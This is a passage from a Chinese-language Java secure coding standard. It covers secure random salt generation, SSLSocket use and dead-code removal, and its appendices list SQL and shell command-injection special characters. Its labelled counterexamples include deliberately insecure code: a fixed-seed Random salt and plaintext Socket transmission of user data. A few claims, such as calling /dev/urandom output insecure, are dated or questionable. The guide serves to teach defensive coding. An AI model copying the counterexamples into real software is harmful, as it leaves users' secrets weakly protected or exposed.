已知的可供产品使用的密码学安全的非物理真随机数产生器有：Linux操作系统的/dev/random设备接 口（存在阻塞问题）和Windows操作系统的 `CryptGenRandom()` 接口。

Java中的 `SecureRandom` 是一种密码学安全的伪随机数产生器，对于使用非真随机数产生器产生随机数 时，要使用少量真随机数作为种子。

常见安全场景包括但不限于以下场景：

- 用于密码算法用途，如生成IV、盐值、密钥等；
- 会话标识（sessionId）的生成；
- 挑战算法中的随机数生成；
- 验证码的随机数生成；

【反例】

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    Random random = new Random(123456L);
    random.nextBytes(salt);
    return salt;
}
```

`Random` 生成是不安全随机数，不能用做盐值。

【反例】

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    SecureRandom random = new SecureRandom();
    random.nextBytes(salt);
    return salt;
}
```

`new SecureRandom()` 在不同的操作系统下，使用不同的随机数生成器（windows下默认是 SHA1PRNG(sun.security.provider.SecureRandom)、linux下默认是 NativePRNG(sun.security.provider.NativePRNG)）。比如linux系统下，默认使用的随机数产生器使用 的种子及生成的随机数都来源于/dev/urandom，生成的随机数是不安全随机数，不能用作盐值。

【反例】

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    try {
        SecureRandom random = SecureRandom.getInstance("SHA1PRNG", "SUN");
        random.setSeed(random.generateSeed(SEED_LEN)); // 频繁设置种子可能会导致阻塞
        random.nextBytes(salt);
    } catch (NoSuchAlgorithmException ex) {
        // 处理异常
    }
    return salt;
}
```

上述代码中，明确指定采用 `sun.security.provider.SecureRandom` 作为随机数产生器，然后使用 `generateSeed()` 方法产生的随机数作为种子，该方法产生的随机数默认为真随机数（如linux下 从/dev/random获取）。上述代码实际是使用少量真随机数作为种子（种子长度推荐不少于 64bytes），然后采用伪随机数产生器来产生随机数，**为了避免linux下阻塞问题，要尽量重复使用随机数生成器，避免频繁设置种子**。对于需要生成大量随机数的场景，需要周期性补充种子，SHA1PRNG算 法目前业界没有明确标准，推荐获取2^32次随机数后设置一次种子（调用一次 `nextBytes()` 、 `nextInt()` 等都计为一次获取随机数操作）。

【正例】（存在较高的阻塞风险）

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    try {
        SecureRandom random = SecureRandom.getInstanceStrong();
        random.nextBytes(salt);
    } catch (NoSuchAlgorithmException ex) {
        // 处理异常
    }
    return salt;
}
```

Java 8中添加了 `SecureRandom.getInstanceStrong()` 方法，用于生成不同平台上的最强的 `SecureRandom` 实现的实例：windows下默认为Windows-PRNG (sun.security.mscapi.PRNG)，使用 `CryptGenRandom()` 方法产生随机数；Solaris/Linux/macOS平台下默认为NativePRNGBlocking (sun.security.provider.NativePRNG$Blocking)，在初始种子、获取随机数、生成种子等场景下都是来 自于/dev/random中的随机数，所以**存在阻塞问题**。对于具体算法可通过java.security配置文件中的 securerandom.strongAlgorithms配置项进行设置。该方式生成的随机数可以用于安全场景，linux场景下需要考虑阻塞问题，防止影响系统的可用性，阻塞问题可参考《密码算法应用规范》。

【正例】（JDK 9+）

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    try {
        SecureRandom random = SecureRandom.getInstance("DRBG",
                                                       DrbgParameters.instantiation(256, RESEED_ONLY, null));
        random.nextBytes(salt);
    } catch (NoSuchAlgorithmException ex) {
        // 处理异常
    }
    return salt;
}
```

从JDK 9开始，新增了由Sun提供的符合NIST SP 800 90-A标准的DRBG伪随机数产生器，包括HASHDRBG、HMAC-DRBG、CTR-DRBG三种，且适用于各种OS，符合公司密码算法相关要求，在使用JDK 9 及以上版本时，推荐优先使用该方式生成安全随机数。

说明：

1. SHA1PRNG算法可以在2022年底前使用。推荐使用的随机数生成算法可参考《密码算法应用规范》。
2. 上述密码算法的说明都是指默认场景，随机数产生器的具体实现、获取种子的来源等都可以在 java.security配置文件中进行设置，更改配置需结合实际配置具体分析。
3. 上述密码算法的说明都是基于标准Java版本，Android系统需要单独确认。例如Android系统下没 有提供使用/dev/random的随机数产生器，需自主实现读取/dev/random随机数的方法。

> G.OTH.02 必须使用SSLSocket代替Socket来进行安全数据交互

【级别】 要求

【描述】

当网络通信中涉及明文的敏感信息时，需要使用SSLSocket而不是Socket，Socket是明文通信，攻击者可以通过网络监听获取其中的敏感信息，通过中间人攻击对报文进行恶意篡改。SSLSocket是在Socket 的基础上进行了一层安全性保护，包括身份认证、数据加密和完整性保护。

【反例】

```java
try {
    Socket socket = new Socket();
    socket.connect(new InetSocketAddress(ip, port), 10000);
    os = socket.getOutputStream();
    os.write(userInfo.getBytes(StandardCharsets.UTF_8));
    ...
} catch (IOException ex) {
    // 处理异常
} finally {
    // 关闭流
}
```

上述示例中，使用socket来明文传输报文信息，报文中的敏感信息存在泄露及篡改的风险。

【正例】

```java
try {
    SSLSocketFactory sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
    SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(ip, port);
    os = sslSocket.getOutputStream();
    os.write(userInfo.getBytes(StandardCharsets.UTF_8));
    ...
} catch (IOException ex) {
    // 处理异常
} finally {
    // 关闭流
}
```

上述示例中，SSLSocket使用SSL/TLS安全协议保护传输的报文。

【例外】

因为SSLSocket提供的报文安全传输机制，将造成巨大的性能开销。在以下情况下，普通的套接字就可以满足需求：

- 套接字上传输的数据不敏感。
- 数据虽然敏感，但是已经过恰当加密。

> G.OTH.03 不用的代码段包括import语句，直接删除，不要注释掉

【级别】 要求

【描述】 不用的import语句，增加了代码的耦合度，不利于维护。

使用注释符（包括 `/** */`， `/* */` 和 `//` ）注释掉的代码，无法被正常维护；当企图恢复使用这些代码时，极有可能引入易被忽略的缺陷。

不需要的代码正确的处理方式是直接删除掉。若再需要时，考虑移植或重写这些代码。

> G.OTH.04 禁止代码中包含公网地址

【级别】 要求

【描述】 代码或脚本中包含用户不可见，不可知的公网地址，可能会引起客户质疑。

对产品发布的软件（包含软件包/补丁包）中包含的公网地址（包括公网IP地址、公网URL地址/域名、 邮箱地址）要求如下：

1. 禁止包含用户界面不可见、或产品资料未描述的未公开的公网地址。
2. 已公开的公网地址禁止写在代码或者脚本中，可以存储在配置文件或数据库中。

对于开源/第三方软件自带的公网地址必须至少满足上述第1条公开性要求。

【例外】

对于标准协议中必须指定公网地址的场景可例外，如soap协议中函数的命名空间必须指定的一个组装的公网URL、http页面中包含w3.org网址、XML解析器中的Feature名等。

> G.OTH.05 删除无效或永不执行的代码

【级别】 要求

【描述】

无效或永不执行的代码（即无效代码或无法访问的代码）通常是编程错误的结果，并且可能导致意外行为。通常在编译时，编译器会对此类代码进行优化。但是，为了提高可读性并确保解决逻辑错误，应该将这类代码直接删除。

【反例】

```java
boolean canEvaluate = false;
if(condition()) {
    canEvaluate = false;
}
...
if(canEvaluate) {
    doSomething();
}
```

上述示例中，由于变量 `canEvaluate` 的值始终为 false ，导致 `doSomething()` 始终无法执行。

【正例】

```java
boolean canEvaluate = false;
if(condition()) {
	canEvaluate = true;
}
...
if(canEvaluate) {
	doSomething();
}
```

上述示例中， `canEvaluate` 变量在不同场景下的值是不同的，这样 `doSomething()` 存在执行的可能 性，保证代码是有效的。

【反例】

```java
private static final boolean ALWAYS_TRUE = true;

public void doSomething() {
    if(condition() && ALWAYS_TRUE) {
    	...
    }
}
```

上述示例中，常量 `ALWAYS_TRUE` 在if条件判断中是多余的，不会对判断条件产生任何影响，可以直接省略。

【例外】

1. 公共库中未使用的导出函数和变量不违反该准则。
2. 在某些情况下，看似无效的代码可能会使软件更具弹性。一个示例是语句中的default 标签，该 switch 语句的控制表达式具有枚举类型，并且为该类型的所有枚举指定标签。



## 4 附录

### 附录A SQL注入相关特殊字符

【表2 常用数据库中与SQL注入攻击相关的特殊字符】

| 数据库     | 特殊字符 | 描述   | 转义序列     |
| ---------- | -------- | ------ | ------------ |
| Oracle     | '        | 单引号 | `''`         |
| MySQL      | '        | 单引号 | `\'`         |
| MySQL      | "        | 双引号 | `\"`         |
| DB2        | '        | 单引号 | `''`         |
| DB2        | ;        | 分号   | `.`          |
| SQL Server | '        | 单引号 | `''`         |
| Gauss      | '        | 单引号 | `''` 或 `\'` |

【表3 like条件中的通配符及转义方式】

| 数据库     | 特殊字符 | 描述                    | 转义序列         |
| ---------- | -------- | ----------------------- | ---------------- |
| Oracle     | %        | 百分号：任意字符（>=0） | `/%`  escape `/` |
| Oracle     | _        | 下划线：任何单字节字符  | `/_`  escape `/` |
| Oracle     | /        | 斜线：转义字符          | `//`  escape `/` |
| MySQL      | \        | 反斜杠                  | `\\`             |
| MySQL      | %        | 百分号：任意字符（>=0） | `\%`             |
| MySQL      | _        | 下划线：任何单字节字符  | `\_`             |
| DB2        | %        | 百分号：任意字符（>=0） | `/%`  escape `/` |
| DB2        | _        | 下划线：任何单字节字符  | `/_`  escape `/` |
| SQL Server | [        | 左方括号：转义字符      | `[[]`            |
| SQL Server | _        | 下划线：任何单字节字符  | `[_]`            |
| SQL Server | %        | 百分号：任意字符（>=0） | `[%]`            |
| SQL Server | ^        | 插入符号：排除下列字符  | `[^]`            |

### 附录B 命令注入相关特殊字符

【表4 shell脚本中常用的与命令注入相关的特殊字符】

| 符号类别   | 符号                                                         | 类型      | 功能描述                                                     |
| ---------- | ------------------------------------------------------------ | --------- | ------------------------------------------------------------ |
| 管道       | \|                                                           | 命令注 入 | 连结上个指令的标准输出，作为下个指令的标准输入               |
| 内联命令   | ;                                                            | 命令注 入 | 连续指令符号                                                 |
| 内联命令   | &                                                            | 命令注 入 | 单一个& 符号，且放在完整指令列的最后端： 表示将该指令列放入后台中工作。 |
| 逻辑操作符 | $                                                            | 命令注 入 | 变量替换(Variable Substitution)的代表符号。                  |
| 表达式     | $                                                            | 命令注 入 | 可用在${}中作为变量的正规表达式。                            |
| 重定向操作 | >                                                            | 命令注 入 | 将命令输出写入到目标文件中                                   |
| 重定向操作 | <                                                            | 命令注 入 | 将目标文件的内容发送到命令当中                               |
| 反引号     | `         | 命令注 入 | 可在``之间构造命令内容并返回当前执行命令的结果。 |           |                                                              |
| 倒斜线     | \                                                            | 命令注 入 | 在交互模式下的escape 字元，有几个作用：  放在指令前，有取消 aliases的作用；  放在特殊符号前，则该特殊符号的作用消失；  放在指令的最末端，表示指令连接下一行。 |
| 感叹号     | !                                                            | 命令注 入 | 事件提示符(Event Designators)，可以引用历史命令。            |
| 换行符     | \n                                                           | 命令注 入 | 可以用在一行命令的结束，用于分隔不同的命令行。               |
| 注释符     | ##                                                            | 命令注 入 | 用于注释，使随后的命令无效。                                 |
| 小括号     | ()                                                           | 命令注 入 | 与联用构成 (shell_command)，可执行其它命令；  构成(command1;command2...)，执行一批指令 |
| 大括号     | {}                                                           | 命令注 入 | 与$联用，操作变量的匹配和替换； 构成{ command1;command2;...;}，执行一批指 令 |
| 空白       | 空格、\t、\r、\n                                             | 参数注 入 | 用于分隔不同的参数、选项等。                                 |
| 横线       | -                                                            | 参数注 入 | 为所执行命令注入选项。                                       |
| 斜线       | /                                                            | 参数注 入 | 为所执行命令注入选项、参数。                                 |

上述字符也可能以组合方式影响命令拼接，如管道符“||”，“>>” ，“<<”，逻辑运算符“&&”等，由于基于 单个危险字符的检测可以识别这部分组合字符，因此不再列出。另外可以表示账户的home目录“~”，可 以表示上层目录的符号“..”，以及文件名通配符“?”（匹配文件名中除null外的单个字元），“*”（匹配文 件名的任意字元）由于只影响命令本身的语义，不会引入额外的命令，因此未列入命令注入涉及的特殊 字符，需根据业务本身的逻辑进行处理。

### 附录C 敏感异常

【表5 常见敏感异常列表】

| 异常名                                      | 信息泄露或威胁描述                                 |
| ------------------------------------------- | -------------------------------------------------- |
| java.io.FileNotFoundException               | 泄露文件系统结构和文件名列举                       |
| java.util.jar.JarException                  | 泄露文件系统结构                                   |
| java.util.MissingResourceException          | 资源列举                                           |
| java.security.acl.NotOwnerException         | 所有人列举                                         |
| java.util.ConcurrentModificationException   | 可能提供线程不安全的代码信息                       |
| javax.naming.InsufficientResourcesException | 服务器资源不足（可能有利于DoS攻击）                |
| java.net.BindException                      | 当不信任客户端能够选择服务器端口时造成开放端口列举 |
| java.lang.OutOfMemoryError                  | DoS                                                |
| java.lang.StackOverflowError                | DoS                                                |
| java.sql.SQLException                       | 数据库结构，用户名列举                             |

### 附录D 常见敏感信息的匿名化处理

【表6 常见敏感信息的匿名化处理样例】

| 敏感信息                                       | 匿名指导                                                     | 举例                                                         |
| ---------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 银行账号                                       | 只显示前6位和后4位                                           | `6200001234561234` ->  `620000******1234`                    |
| 权威社会识别 号（身份证号、护照号、 驾照号等） | 身份证号掩掉出生年月日和后4 位                               | `123456196010201234` ->  `123456************`                |
| 详细通信地址                                   | 显示到镇                                                     | `北京市海淀区上地信息路XX号XX大厦` ->  `北京市海淀区上地**路**号***` |
| 电话号码                                       | 电话号码是比较敏感的， 用户有拒绝来电的需求， 在营销场景下风险级别为高， 只显示前3位和后4位 | `12345678911` ->  `123****8911`                              |
| 邮箱地址                                       | 邮箱域名可保留， 对@前的字符进行匿名化                       | `tom123@aabbcc.com` ->  `tom***@aabbcc.com`                  |
| IP地址                                         | IPv4掩掉后8bit、IPv6掩掉后 88bit                             | IPv4掩掉后8bit，如： `10.11.12.123` ->  `10.11.12.***`;  IPv6掩掉后88bit，如：  `1080:1:1012:1:8:800:200C:417A` -> `1080:1:10**:*:*:***:****:****` |
| MAC地址                                        | 掩掉后4位或加盐hash                                          | `12-34-56-78-9A-BC` ->  `12-34-56-78-**-**`                  |

### 附录E 典型编码问题及相关规范条款

【数据净化问题_CWE_137】

| 类型                 | 规范条款                                                     |
| -------------------- | ------------------------------------------------------------ |
| 命令注入             | 禁止直接向Runtime.exec()方法或java.lang.ProcessBuilder类传递外部数据 |
| XXE                  | 防止解析来自外部的XML导致的外部实体（XML External Entity）攻击  防止解析来自外部的XML导致的内部实体扩展（XML Entity Expansion）攻击 |
| SQL注入              | 禁止直接使用外部数据来拼接SQL语句                            |
| 日志注入             | 禁止直接使用外部数据记录日志                                 |
| ReDos                | 正则表达式应该尽量简单，防止ReDos攻击                        |
| zip解压              | 从ZipInputStream中解压文件必须进行安全检查                   |
| 不一致校验           | 跨信任边界传递的外部数据使用前必须进行校验                   |
| 未受控的格式化字符串 | 禁止使用外部数据构造格式化字符串                             |
| 不安全反射           | 禁止直接使用外部数据作为反射操作中的类名/方法名              |

【错误条件、返回值、状态码_CWE_398】

| 类型                 | 规范条款                                                     |
| -------------------- | ------------------------------------------------------------ |
| 引用空指针           | 禁止直接使用可能为null的对象，防止出现空指针引用  不要直接捕获可通过预检查进行处理的RuntimeException，如 NullPointerException、IndexOutOfBoundsException等 |
| 未正确处理异常       | 不要直接捕获受检异常的基类Exception                          |
| 不正确的数组索引验证 | 不要直接捕获可通过预检查进行处理的RuntimeException，如 NullPointerException、IndexOutOfBoundsException等 |

【文件处理问题_CWE_1216】

| 类型               | 规范条款                                                     |
| ------------------ | ------------------------------------------------------------ |
| 路径遍历和等价错误 | 使用外部数据构造的文件路径前必须进行校验，校验前必须对文件路径进行 规范化处理 |
| 临时文件未清理     | 临时文件使用完毕必须及时删除                                 |

【资源管理问题_CWE_399】

| 类型                   | 规范条款                                                   |
| ---------------------- | ---------------------------------------------------------- |
| 不安全反序列化         | 禁止直接将外部数据进行反序列化                             |
| 不正确的资源关闭或释放 | 进行IO类操作时，必须在try-with-resource或finally里关闭资源 |

【信息管理错误_CWE_199】

| 类型         | 规范条款                                                     |
| ------------ | ------------------------------------------------------------ |
| 敏感泄露信息 | 禁止在日志中记录口令、密钥等敏感信息  序列化操作要防止敏感信息泄露 |

【不良代码实践_CWE_1006】

| 类型     | 规范条款                                     |
| -------- | -------------------------------------------- |
| 废弃代码 | 不用的代码段包括import，直接删除，不要注释掉 |

【并发问题_CWE_557】

| 类型       | 规范条款                                                     |
| ---------- | ------------------------------------------------------------ |
| 条件竞争   | 避免数据竞争data race                                        |
| 不正确的锁 | 对共享变量做同步访问控制时需避开同步陷阱  禁止将系统内部使用的锁对象暴露给不可信代码 |

【数值错误_CWE_189】

| 类型     | 规范条款                     |
| -------- | ---------------------------- |
| 整数溢出 | 进行数值运算时，避免整数溢出 |